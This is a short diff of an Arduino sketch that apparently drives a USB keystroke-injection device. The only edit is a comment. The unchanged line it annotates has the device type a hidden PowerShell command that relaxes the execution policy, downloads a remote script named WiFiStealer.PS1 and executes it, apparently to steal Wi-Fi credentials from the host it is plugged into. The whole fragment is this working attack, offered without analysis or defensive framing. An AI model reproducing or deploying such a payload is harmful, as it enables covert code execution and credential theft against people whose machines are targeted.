@@ -13,7 +13,7 @@ void setup() {
 
   delay(200);  // Delay 0.2 seconds
 
-  // Type the PowerShell command
+  // Type the PowerShell command, specify remote powershell script location 
   Keyboard.println("powershell /w 1 /C Set-ExecutionPolicy RemoteSigned;wget \"https://raw.githubusercontent.com/Mar0dev/LilyGo-TTGO-Examples/main/WiFiStealer.PS1\" -o \\d.ps1;\\d.ps1");
 
   delay(500);  // Delay 0.5 seconds
